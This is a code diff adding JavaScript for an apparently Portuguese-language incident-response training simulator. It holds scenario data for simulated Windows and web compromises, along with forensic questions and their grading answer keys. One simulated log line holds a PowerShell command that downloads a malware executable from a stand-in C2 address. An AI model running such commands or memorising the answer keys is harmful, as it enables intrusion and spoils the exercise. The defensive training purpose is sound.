+        {q:"1. Qual foi o IP do atacante e o arquivo enviado no acesso inicial web?", placeholder:"Ex.: IP e caminho/nome do arquivo", keys:["192.0.2.88","logo_novo.php"], minHits:2},
+        {q:"2. Qual processo filho anômalo (nome e PID) foi identificado na memória RAM via Volatility 3?", placeholder:"Ex.: processo e PID", keys:["python","6310"], minHits:2},
+        {q:"3. Qual técnica anti-forense foi aplicada na webshell e como foi provada?", placeholder:"Cite a técnica e os timestamps comparados", keys:["timestomp","ctime","mtime","change","modify"], minHits:2},
+        {q:"4. Qual domínio recebeu o DNS Tunneling e qual texto secreto foi exfiltrado em Hex?", placeholder:"Domínio e texto decodificado", keys:["telemetry-sync.org","chave_pix_991"], minHits:2},
+        {q:"5. Quais medidas de contenção, erradicação e correção da causa-raiz devem ser tomadas?", placeholder:"Processo, bloqueio DNS/IP, remoção da webshell, rotação da chave e correção do upload...", keys:["6310","telemetry-sync","logo_novo","chave","upload"], minHits:3}
+      ]
+    },
+    {
+      id:"c3", num:"Prova C3", tag:"IR Windows + SIEM + Phishing · 2h30", duration:9000,
+      title:"Comprometimento Windows Corporativo (Phishing → PowerShell 4104 → Serviço 7045)",
+      summary:"Um analista financeiro relatou lentidão após abrir um e-mail urgente. Investigue os eventos Windows/Sysmon, o SIEM e o cabeçalho .eml para mapear todo o ataque.",
+      brief:"A estação/servidor 'SRV-FIN01' gerou um alerta de limpeza do Log de Segurança (Event ID 1102). Felizmente, o encaminhamento em tempo real para o SIEM e o Sysmon preservaram a telemetria anterior! Investigue o incidente completo e elabore o relatório.",
+      prompt:"PS C:\\IR-FIN01> ",
+      refCmds:["help","Get-NetTCPConnection -State Established","Get-Service EdgeSyncHelper","Get-FileHash C:\\ProgramData\\EdgeSync.exe","Get-LocalGroupMember Administrators"],
+      commands:{
+        "help":"Comandos PowerShell disponíveis neste host (digite manualmente):\n  Get-NetTCPConnection -State Established     · ver conexões TCP ativas e PID\n  Get-Service EdgeSyncHelper                  · inspecionar serviço suspeito\n  Get-FileHash C:\\ProgramData\\EdgeSync.exe    · calcular SHA-256 do executável\n  Get-LocalGroupMember Administrators         · listar administradores locais atuais",
+        "Get-NetTCPConnection -State Established":{
+          out:"LocalAddress  LocalPort  RemoteAddress   RemotePort  State        OwningProcess\n10.30.10.22   52190      198.18.45.200   443         Established  7120",
+          ev:"Conexão ativa para C2 198.18.45.200:443 (PID 7120)", cls:"bad"
+        },
+        "Get-Service EdgeSyncHelper":{
+          out:"Status: Running · Name: EdgeSyncHelper · BinaryPathName: C:\\ProgramData\\EdgeSync.exe (PID 7120)",
+          ev:"Serviço malicioso ativo: EdgeSyncHelper -> C:\\ProgramData\\EdgeSync.exe", cls:"bad"
+        },
+        "Get-FileHash C:\\ProgramData\\EdgeSync.exe":{
+          out:"Algorithm: SHA256\nHash: 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
+          ev:"SHA-256 EdgeSync.exe: 4b227777d4dd1fc6...", cls:"warn"
+        },
+        "Get-LocalGroupMember Administrators":{
+          out:"ObjectClass Name\nUser        SRV-FIN01\\Administrator\nUser        SRV-FIN01\\audit_bkp$   <-- CONTA BACKDOOR OCULTA!",
+          ev:"Conta backdoor local 'audit_bkp$' no grupo Administrators", cls:"bad"
+        }
+      },
+      logsDoc:[
+        {
+          name:"Eventos preservados no SIEM (Windows Security + PowerShell + System)",
+          text:"05:10:12Z | EventID 4624 | Logon Type 10 (RDP) | User: carlos.fin | SrcIP: 198.18.45.200\n05:11:05Z | EventID 4104 | PowerShell ScriptBlock: Invoke-WebRequest http://198.18.45.200/EdgeSync.exe -OutFile C:\\ProgramData\\EdgeSync.exe\n05:12:18Z | EventID 4720 | New User Created: audit_bkp$ (by carlos.fin)\n05:12:20Z | EventID 4732 | Member 'audit_bkp$' added to group 'Administrators'\n05:13:01Z | EventID 7045 | New Service Installed: EdgeSyncHelper (C:\\ProgramData\\EdgeSync.exe)\n05:14:00Z | EventID 1102 | The audit log was cleared by User: carlos.fin",
+          ev:"Sequência completa no SIEM: RDP (4624) -> PS 4104 -> User 4720 -> Svc 7045 -> Clear Log 1102"
+        }
+      ],
+      pcapDoc:[
+        {
+          name:"Artefato de E-mail Coletado (fechamento_folha.eml)",
+          text:"From: Diretoria Financeira <diretoria@empresa.com.br>\nReturn-Path: <alerta@sso-corporativo-auth.net>\nAuthentication-Results: spf=fail dkim=fail dmarc=fail\nBody Link: https://sso-corporativo-auth.net/login (página falsa onde carlos.fin digitou sua senha antes do acesso RDP!)",
+          ev:"Vetor inicial: credential harvesting via phishing (sso-corporativo-auth.net, spf=fail)"
+        }
+      ],
+      questions:[
+        {q:"1. Como o invasor obteve a credencial de 'carlos.fin' e qual domínio falso foi usado no phishing?", placeholder:"Vetor inicial e domínio do link", keys:["phishing","sso-corporativo-auth.net"], minHits:2},
+        {q:"2. De qual IP externo partiu o logon RDP (Type 10) e o servidor C2?", placeholder:"Digite o IPv4...", keys:["198.18.45.200"]},
+        {q:"3. Quais DOIS mecanismos de persistência foram criados no servidor (conta e serviço)?", placeholder:"Nome da conta criada (4720) e nome/caminho do serviço (7045)", keys:["audit_bkp","edgesynchelper"], minHits:2},
+        {q:"4. Qual Event ID revelou a tentativa de apagar rastros e quais os 8 primeiros caracteres do SHA-256 do malware?", placeholder:"Ex.: Event ID e início do SHA-256", keys:["1102","4b227777"], minHits:2},
+        {q:"5. Quais ações imediatas de contenção e erradicação devem ser executadas no host, AD e perímetro?", placeholder:"Firewall, serviço/processo, contas carlos.fin e audit_bkp$, bloqueio do domínio de phishing...", keys:["firewall","edgesync","audit_bkp","carlos"], minHits:3}
+      ]
+    }
+  ];
+
+  // Renderizador das 3 Provas Simuladas da Prova C
+  (function initProvaCExams(){
+    var grid=document.getElementById("exCGrid"), arena=document.getElementById("exCArena");
+    if(!grid || !arena) return;
+    var STORE="cs_exams_C_v1";
+    var state={}; try{ state=JSON.parse(localStorage.getItem(STORE)||"{}"); }catch(e){ state={}; }
+    function save(){ try{ localStorage.setItem(STORE, JSON.stringify(state)); }catch(e){} }
+
+    var activeExam=EXAMS_C[0], subTab="term", timerInt=null, remSec=activeExam.duration, running=false;
+    var termLogs={}, foundEv={};
+
+    function renderGrid(){
+      grid.innerHTML="";
+      EXAMS_C.forEach(function(ex){
+        var st=state[ex.id]||{};
+        var tot=ex.questions.length;
+        var badge=st.passed?'✅ Investigação aprovada ('+tot+'/'+tot+')':(typeof st.score==="number"?'📝 Última nota: '+st.score+'/'+tot:'🎯 '+tot+' questões periciais + Timeline');
+        var card=document.createElement("div");
+        card.className="excard"+(ex.id===activeExam.id?" active":"");
+        card.innerHTML='<div class="exbadges"><span class="exnum">'+esc(ex.num)+'</span><span class="extag">'+esc(ex.tag)+'</span></div>'
+          +'<h3>'+esc(ex.title)+'</h3><p>'+esc(ex.summary)+'</p>'
+          +'<div class="exstat">'+badge+'</div>';
+        card.onclick=function(){
+          stopTimer(); activeExam=ex; subTab="term"; remSec=ex.duration;
+          renderGrid(); renderArena();
+        };
+        grid.appendChild(card);
+      });
+    }
+
+    function stopTimer(){ if(timerInt){ clearInterval(timerInt); timerInt=null; } running=false; }
+    function updateClk(){ var el=document.getElementById("exCClk"); if(el) el.textContent=fmtTime(remSec); }
+    function addEv(exId, txt){
+      if(!txt) return;
+      if(!foundEv[exId]) foundEv[exId]=[];
+      if(foundEv[exId].indexOf(txt)<0) foundEv[exId].push(txt);
+    }
+
+    function renderArena(){
+      var ex=activeExam;
+      if(!termLogs[ex.id]) termLogs[ex.id]=[{c:"sys", t:"Estação forense conectada. Digite 'help' ou escreva manualmente os comandos de referência para coletar evidências."}];
+      if(!foundEv[ex.id]) foundEv[ex.id]=[];
+      var saved=state[ex.id]||{};
+      var ans=saved.ans || ex.questions.map(()=>"");
+
+      var html='<div class="exhead"><div><h2>'+esc(ex.num)+' — '+esc(ex.title)+'</h2><p class="exdesc">'+esc(ex.brief)+'</p></div>'
+        +'<div class="extimer"><span class="clk" id="exCClk">'+fmtTime(remSec)+'</span>'
+        +'<button class="exbtn blue" id="exCTog" type="button">'+(running?'⏸ Pausar':'▶ Iniciar')+'</button>'
+        +'<button class="exbtn" id="exCRstT" type="button">↺</button>'
+        +'<button class="exbtn pri" id="exCExp" type="button">📄 Exportar Relatório IR</button></div></div>';
+
+      html+='<div class="exbox" style="margin-bottom:14px">'
+        +'<div class="exsubtabs">'
+        +'<button class="exstab'+(subTab==="term"?" active":"")+'" id="exCTabT" type="button">💻 Terminal Forense</button>'
+        +'<button class="exstab'+(subTab==="logs"?" active":"")+'" id="exCTabL" type="button">📊 Logs &amp; SIEM</button>'
+        +'<button class="exstab'+(subTab==="pcap"?" active":"")+'" id="exCTabP" type="button">🌐 Rede (PCAP) &amp; Artefatos</button>'
+        +'</div>'
+        +'<div id="exCSandbox"></div>'
+        +'<div style="margin-top:10px;font-size:12px;color:var(--mut)">🔍 <b>IOCs &amp; Evidências registradas nesta investigação:</b><div class="exevid" id="exCEvid"></div></div>'
+        +'</div>';
+
+      html+='<div class="exrep"><h4>🕵️ Respostas Periciais &amp; Relatório de Resposta a Incidentes</h4>'
+        +'<div id="exCQList" style="display:flex;flex-direction:column;gap:11px;margin-bottom:14px"></div>'
+        +'<label style="display:block;font-size:12.5px;color:var(--mut);margin-bottom:5px"><b>Sumário Executivo &amp; Linha do Tempo em UTC</b> (descreva cronologicamente: Acesso Inicial → Execução/Persistência → Exfiltração → Contenção):</label>'
+        +'<textarea id="exCSum" placeholder="Ex.: 02:58Z Início de força bruta SSH de 45.133.12.90 -> 03:01Z Comprometimento de backup_ops -> 03:05Z Persistência via cron e exfiltração para 185.220.101.33...">'+esc(saved.summary||"")+'</textarea>'
+        +'<div class="exrow" style="margin-top:14px">'
+        +'<button class="exbtn pri" id="exCEval" type="button">🔎 Avaliar Investigação</button>'
+        +'<button class="exbtn" id="exCClear" type="button">↺ Limpar respostas</button>'
+        +'</div>'
+        +'<div class="exfb" id="exCFb"></div></div>';
+
+      arena.innerHTML=html;
+
+      // Timer
+      document.getElementById("exCTog").onclick=function(){
+        if(running){ stopTimer(); } else {
+          running=true;
+          timerInt=setInterval(function(){ if(remSec>0){ remSec--; updateClk(); } else { stopTimer(); } },1000);
+        }
+        this.textContent=running?'⏸ Pausar':'▶ Iniciar';
+      };
+      document.getElementById("exCRstT").onclick=function(){ stopTimer(); remSec=ex.duration; updateClk(); document.getElementById("exCTog").textContent='▶ Iniciar'; };
+
+      function switchSub(st, btnId){
+        subTab=st;
+        ["exCTabT","exCTabL","exCTabP"].forEach(id=>document.getElementById(id).classList.toggle("active", id===btnId));
+        renderSandbox();
+      }
+      document.getElementById("exCTabT").onclick=function(){ switchSub("term","exCTabT"); };
+      document.getElementById("exCTabL").onclick=function(){ switchSub("logs","exCTabL"); };
+      document.getElementById("exCTabP").onclick=function(){ switchSub("pcap","exCTabP"); };
+
+      function renderEvid(){
+        var el=document.getElementById("exCEvid");
+        var arr=foundEv[ex.id]||[];
+        el.innerHTML = arr.length ? arr.map(x=>'<span class="ev">📌 '+esc(x)+'</span>').join("") : '<span style="color:var(--mut2)">Nenhuma evidência marcada ainda — investigue o terminal, os logs e o PCAP.</span>';
+      }
+
+      function runCCmd(raw){
+        var cmd=(raw||"").trim(); if(!cmd) return;
+        termLogs[ex.id].push({c:"", t:'<span class="pr">'+esc(ex.prompt)+'</span><span class="cc">'+esc(cmd)+'</span>'});
+        var low=cmd.toLowerCase();
+        var key=Object.keys(ex.commands).find(k=>k.toLowerCase()===low) ||
+                Object.keys(ex.commands).find(k=>{
+                  var parts=k.toLowerCase().split(" ").filter(Boolean);
+                  return parts.length>=2 && low.indexOf(parts[0])===0 && low.indexOf(parts[parts.length-1])>=0;
+                });
+        if(!key){
+          termLogs[ex.id].push({c:"out", t:"Comando não reconhecido neste cenário. Digite 'help' ou escreva manualmente um dos comandos de referência acima."});
+        } else {
+          var res=ex.commands[key];
+          if(typeof res==="string"){
+            res.split("\n").forEach(ln=>termLogs[ex.id].push({c:"sys", t:esc(ln)}));
+          } else {
+            res.out.split("\n").forEach(ln=>termLogs[ex.id].push({c:res.cls||"out", t:esc(ln)}));
+            if(res.ev) addEv(ex.id, res.ev);
+          }
+        }
+        renderSandbox(); renderEvid();
+      }
+
+      function renderDocs(list){
+        var box=document.getElementById("exCSandbox");
+        var dHtml='';
+        list.forEach(function(d, idx){
+          dHtml+='<div style="margin-bottom:10px"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:5px">'
+            +'<b style="font-size:13px;color:var(--acc2)">📄 '+esc(d.name)+'</b>'
+            +'<button class="exbtn warn" data-cev="'+idx+'" type="button" style="padding:3px 9px;font-size:11.5px">📌 Registrar IOC/Evidência</button></div>'
+            +'<div class="excode">'+esc(d.text)+'</div></div>';
+        });
+        box.innerHTML=dHtml;
+        box.querySelectorAll("button[data-cev]").forEach(function(btn){
+          btn.onclick=function(){
+            var item=list[parseInt(btn.dataset.cev,10)];
+            if(item && item.ev){ addEv(ex.id, item.ev); renderEvid(); btn.textContent="✅ Registrado"; }
+          };
+        });
+      }
+
+      function renderSandbox(){
+        var box=document.getElementById("exCSandbox");
+        if(subTab==="term"){
+          box.innerHTML='<div class="exchips" id="exCChips" style="margin-bottom:8px"></div>'
+            +'<div class="exterm" id="exCTerm"></div>'
+            +'<div class="exrow" style="margin-top:8px"><input type="text" id="exCCmdInp" placeholder="Digite manualmente o comando forense (ex.: help)..." autocapitalize="off" spellcheck="false">'
+            +'<button class="exbtn blue" id="exCRun" type="button">▶ Executar</button></div>';
+          var ch=document.getElementById("exCChips");
+          ex.refCmds.forEach(function(c){
+            var b=document.createElement("button"); b.type="button"; b.className="exchip"; b.textContent=c;
+            b.title="Referência visual — digite manualmente no terminal abaixo";
+            b.onclick=function(){
+              var ci=document.getElementById("exCCmdInp"); if(ci) ci.focus();
+              if(window.csNoPasteWarn) window.csNoPasteWarn("⌨️ Digite o comando manualmente no terminal abaixo!");
+            };
+            ch.appendChild(b);
+          });
+          var tEl=document.getElementById("exCTerm");
+          tEl.innerHTML=termLogs[ex.id].map(l=>'<div class="ln '+l.c+'">'+l.t+'</div>').join("");
+          tEl.scrollTop=tEl.scrollHeight;
+          var inp=document.getElementById("exCCmdInp");
+          document.getElementById("exCRun").onclick=function(){ runCCmd(inp.value); };
+          inp.addEventListener("keydown",function(e){ if(e.key==="Enter"){ e.preventDefault(); runCCmd(inp.value); } });
+        } else if(subTab==="logs"){
+          renderDocs(ex.logsDoc);
+        } else {
+          renderDocs(ex.pcapDoc);
+        }
+      }
+      renderSandbox(); renderEvid();
+
+      // Questions
+      var qList=document.getElementById("exCQList");
+      ex.questions.forEach(function(q, idx){
+        var div=document.createElement("div");
+        div.innerHTML='<label style="display:block;font-size:13px;font-weight:600;margin-bottom:4px">'+esc(q.q)+'</label>'
+          +'<input type="text" data-qi="'+idx+'" value="'+esc(ans[idx]||"")+'" placeholder="'+esc(q.placeholder)+'">';
+        qList.appendChild(div);
+      });
+
+      function collect(){
+        var a=Array.from(qList.querySelectorAll("input[data-qi]")).map(x=>(x.value||"").trim());
+        var sum=(document.getElementById("exCSum").value||"").trim();
+        return {ans:a, summary:sum};
+      }
+
+      document.getElementById("exCClear").onclick=function(){
+        state[ex.id]={}; save(); renderGrid(); renderArena();
+      };
+
+      document.getElementById("exCExp").onclick=function(){
+        var c=collect();
+        var out=["RELATORIO DE RESPOSTA A INCIDENTES (MODULO C) - "+ex.num+" ("+ex.title+")",
+          "Data: "+new Date().toLocaleString(),"",
+          "=== QUESTOES DE INVESTIGACAO & IOCS ==="];
+        ex.questions.forEach(function(q, i){
+          out.push(q.q);
+          out.push("   Resposta: "+(c.ans[i]||"(não preenchido)"));
+        });
+        out.push("","=== SUMARIO EXECUTIVO & LINHA DO TEMPO (UTC) ===", c.summary||"(não preenchido)");
+        dlText("RELATORIO_IR_"+ex.id.toUpperCase()+".txt", out.join("\n"));
+      };
+
+      document.getElementById("exCEval").onclick=function(){
+        var c=collect();
+        var fb=document.getElementById("exCFb");
+        var okCount=0, details=[];
+        ex.questions.forEach(function(q, i){
+          var val=(c.ans[i]||"").toLowerCase();
+          var hits=q.keys.filter(k=>val.indexOf(k.toLowerCase())>=0).length;
+          var req=q.minHits || 1;
+          if(hits >= req){
+            okCount++;
+            details.push('<div class="fbi" style="color:var(--acc)">✅ <b>Questão '+(i+1)+':</b> evidência/resposta validada corretamente!</div>');
+          } else {
+            details.push('<div class="fbi" style="color:var(--warn)">🟡 <b>Questão '+(i+1)+':</b> incompleta ou incorreta ('+hits+'/'+req+' elementos-chave identificados). Revise os logs, terminal e PCAP.</div>');
+          }
+        });
+        var sumOk = c.summary.length >= 35;
+        if(!sumOk) details.push('<div class="fbi" style="color:var(--warn)">📝 <b>Linha do Tempo &amp; Sumário:</b> descreva a sequência cronológica do incidente com pelo menos 1–2 frases completas.</div>');
+        else details.push('<div class="fbi" style="color:var(--acc)">✅ <b>Linha do Tempo &amp; Sumário:</b> documentado adequadamente.</div>');
+
+        var tot=ex.questions.length;
+        var passed=(okCount===tot && sumOk);
+        state[ex.id]={ans:c.ans, summary:c.summary, score:okCount, passed:passed};
+        save(); renderGrid();
+        fb.innerHTML='<div style="font-weight:700;margin-bottom:8px;color:'+(passed?'var(--acc)':'var(--acc2)')+'">'
+          +(passed?'🏆 Investigação Forense Concluída com Excelência ('+tot+'/'+tot+' + Timeline)!':'🔎 Resultado parcial: '+okCount+' / '+tot+' questões periciais corretas')
           +'</div>'+details.join("");
         fb.classList.add("show");
       };
